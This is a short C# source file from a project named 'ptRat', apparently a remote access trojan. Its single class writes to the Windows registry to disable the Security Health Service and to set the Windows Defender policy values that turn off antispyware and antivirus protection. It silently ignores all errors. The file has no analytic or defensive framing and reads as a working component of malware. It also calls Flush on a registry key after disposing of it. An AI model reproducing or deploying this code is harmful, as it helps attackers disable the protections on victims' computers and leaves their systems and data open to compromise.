using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ptRat.Lib
{
    internal class PathWinDef
    {
        public PathWinDef()
        {
            try
            {
                using (RegistryKey Reg = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", true))
                {
                    Reg.SetValue("Start", 4);
                    Reg.Dispose();
                    Reg.Flush();
                }

                using (RegistryKey Reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", true))
                {
                    Reg.SetValue("DisableAntiSpyware", 1);
                    Reg.SetValue("DisableAntiVirus", 1);
                    Reg.Dispose();
                    Reg.Flush();
                }
            } catch { }
        }
    }
}
